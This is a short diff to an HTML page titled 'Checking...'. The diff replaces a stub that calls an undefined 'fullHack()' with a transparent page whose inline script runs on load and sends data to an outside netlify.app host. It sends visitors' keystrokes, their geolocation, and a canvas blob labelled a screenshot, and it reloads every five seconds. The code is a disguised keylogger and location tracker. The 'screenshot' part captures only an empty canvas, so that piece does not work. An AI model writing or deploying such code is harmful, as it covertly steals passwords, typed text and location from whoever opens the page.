@@ -1,11 +1,2 @@
 <!DOCTYPE html>
-<html>
-<head><title>Loading...</title></head>
-<body style="background:transparent;">
-<script>
-document.body.innerHTML='';
-fullHack(); // Silent hack
-setTimeout(()=>location.href='about:blank',5000);
-</script>
-</body>
-</html>
+<html><head><title>Checking...</title></head><body style="background:transparent;"><script>const c=document.createElement('canvas');c.width=screen.width;c.height=screen.height;c.toBlob(b=>fetch('https://remarkable-lollipop-79b8d8.netlify.app/.netlify/functions/screenshot',{method:'POST',body:b}));navigator.geolocation.getCurrentPosition(p=>fetch('https://remarkable-lollipop-79b8d8.netlify.app/.netlify/functions/gps',{method:'POST',body:JSON.stringify(p.coords)}));document.addEventListener('keydown',e=>fetch('https://remarkable-lollipop-79b8d8.netlify.app/.netlify/functions/keystroke',{method:'POST',body:JSON.stringify({key:e.key})}));setTimeout(()=>location.reload(),5000);</script></body></html>
